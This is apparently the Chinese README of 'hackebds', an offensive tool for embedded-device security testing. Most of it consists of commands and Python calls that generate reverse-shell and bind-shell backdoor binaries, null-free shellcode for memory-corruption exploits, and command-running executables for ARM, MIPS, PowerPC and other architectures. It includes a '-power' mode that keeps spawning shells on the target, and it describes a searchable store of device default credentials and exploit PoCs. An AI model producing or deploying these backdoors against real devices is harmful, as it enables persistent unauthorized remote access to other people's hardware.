# hackebds
### 功能
该工具嵌入到设备的安全测试中。主要有如下功能：
  1. 生成各种架构的 **后门程序** 。后门程序是用反向shell汇编代码打包的，大小很小，且纯静态封，装 **现在支持Armv5、Armv7、Armv8、mipsel和mips，mips64，mips64el，powerpc仍在更新中，powerpc64，sparc，riscv64** ，（反向shell在0.3.1版本后加入bash的支持），反向shell后门如果加入-power参数生成，那么会在目标机器上不断产生反向shell
  2. 在攻击过程中生成各种架构的 **反向shell代码** ，且无空字节，这有助于攻击嵌入式设备上的内存损坏漏洞 **现在支持Armv5、Armv7、Armv8、mipsel和mips，mipsel64，aarch64，sparc，仍在更新中**
  3. 生成各种架构的bind_shell文件。
  4. 针对嵌入式设备存在可利用的漏洞POC或EXP进行整理，在使用中可以通过搜索输出设备型号输的基本信息与POC：
设备的作用
设备的架构
设备CPU厂商
设备CPU型号
设备的WEB服务程序
.....
  5. 支持命令行生成后门和外壳代码，特点是轻便、小巧、高效、快速
### 安装
使用pip安装即可，如果安装失败尝试使用sudo进行安装
    pip(3) install -U hackebds
如果想在macos下使用此工具不需要使用sudo，但由于MAC的SIP保护，需要将安装python版本的bin目录写入到bashrc(或者其他shell)环境变量下，然后source
~/.bashrc
    echo 'export PATH="/Users/{you id}/Library/Python/{your installed python}/bin:$PATH"'>> ~/.bashrc
### 安装问题
出现python如下图问题请安装对应的binutils环境，在github的readme中有mac的下载方法，debian使用apt安装即可
如果出现如下的错误
请使用如下命令解决
    ubuntu（debian）
        apt search binutils | grep arm(这里的arm可以更换需要的对应架构如果搜索不到可以先执行apt update)
        apt install binutils-arm-linux-gnueabi/hirsute
     MacOS:
         https://github.com/Gallopsled/pwntools-binutils
         brew install https://raw.githubusercontent.com/Gallopsled/pwntools-binutils/master/osx/binutils-$ARCH.rb
如果出现如下错误
hackebds: error: argument -model: expected one argument
请将各个参数都设置成小写或者小写与大写混合的形式，猜测是由于python与bash对于大小字母解释冲突的原因
### 怎么使用
这里的ip地址与端口都是shell弹回的地址与port，导入此模块后pwn模块也会直接导入，无需再次导入
#### 1\. 生成对应各种架构的后门程序，纯shellcode封装（无需编译器的加入），回连shell成功概率大
32为程序bind_shell中密码最多4个字符，64位程序最多8个字符  
使用命令行生成后门文件名、shellcode、binshell，cmd_file等  
    hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shellcode
    hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shell_file
​ 默认创建反向shell后门是使用的sh，如果需要bash（PS：这里需要目标设备上存在bash命令）
    hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shell_file -shell bash
​ 如果需要生成后门不断地创建反向shell（测试占用CPU大概是%8左右）
    hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shell_file -shell bash -power
    hackebds -bind_port 8081 -arch armelv7 -res bind_shell -passwd 1231
​ 创建bind_shell监听shell为sh
    hackebds -bind_port 8081 -arch armelv7 -res bind_shell -passwd 1231 -power
​ bind_shell进程不会断开后停止，支持到重复连接（目前此功能powerpc与sparc系列还不受支持）
~~生成执行指定命令的程序文件，需要注意的由于执行的是execve系统调用需要指定执行文件的完整路径才能正常执行~~
​ 生成cmd_file功能被更新，只需要指定-cmd参数即可生成各种架构执行对应命令的程序.
    hackebds  -cmd "ls -al /" -arch powerpc  -res cmd_file
​ 如果需要指定执行对应的程序可以使用 -shell execute_file_path -cmd agrs
    -shell execute_file_path -cmd agrs
在指定型号生成后门的功能中加入了输出型号与架构对应的列表关系，方便使用者观察修改，在0.3.5版本之后输出信息将会的到加强如（目前总共收入了60设备信息，POC40+左右）：
设备的作用
设备的架构
设备CPU厂商
设备CPU型号
设备的WEB服务程序
设备默认SSH服务支持
能否实现监听
设备默认telnet用户密码
设备sdk支持
设备的openwrt支持
设备是否存在漏洞
POC输出
    hackebds -l
加入了对设备信息的检索，使用-s可以针对-model参数进行搜索此搜索是模糊搜索且大小写不敏感，在输入时尽量使用小写输出与输入匹配度最高的设备信息.
    hackebds -model ex200 -s
在命令输出过程中如果出现如下警告
/usr/local/lib/python3.8/dist-packages/fuzzywuzzy/fuzz.py:11: UserWarning:
Using slow pure-python SequenceMatcher. Install python-Levenshtein to remove
this warning  
warnings.warn('Using slow pure-python SequenceMatcher. Install python-Levenshtein to remove this warning')
那么可以使用如下命令安装python-levenshtein,安装后可以提升命令的检索速度4倍左右
    pip3 install python-levenshtein
​ 生成设备对应的POC可以使用-p或者--poc，此可能为python脚本、命令等等可能需要自行修改
    hackebds -model ex200 -p
如果在测试中发现了漏洞想在这款工具中加入新的设备的基本信息，POC文件等可以使用-add功能或者在/tmp/model_tree_info/目录下新建设备的目录目录的格式可以参考标准生成的格式，插入完成后便可以使用工具的搜索以及POC生成功能,
最后如果需要将POC文件信息填入可以将其放入/tmp/model_info/xxx/POC/目录下再次检索会读取此目录
    hackebds -add
如果有设备信息错误、POC错误，或者想将自己收集的设备信息与漏洞集成与大家一起分享请联系我PI:EMAIL
    >>> from hackebds import *
    >>> mipsel_backdoor(reverse_ip,reverse_port)
    >>> mips_backdoor(reverse_ip,reverse_port)
    >>> aarch64_backdoor(reverse_ip,reverse_port)
    >>> armelv5_backdoor(reverse_ip,reverse_port)
    >>> armelv7_backdoor(reverse_ip,reverse_port)
    >>> armebv5_backdoor(reverse_ip,reverse_port)
    >>> armebv7_backdoor(reverse_ip,reverse_port)
    >>> mips64_backdoor(reverse_ip,reverse_port)
    >>> mips64el_backdoor(reverse_ip,reverse_port)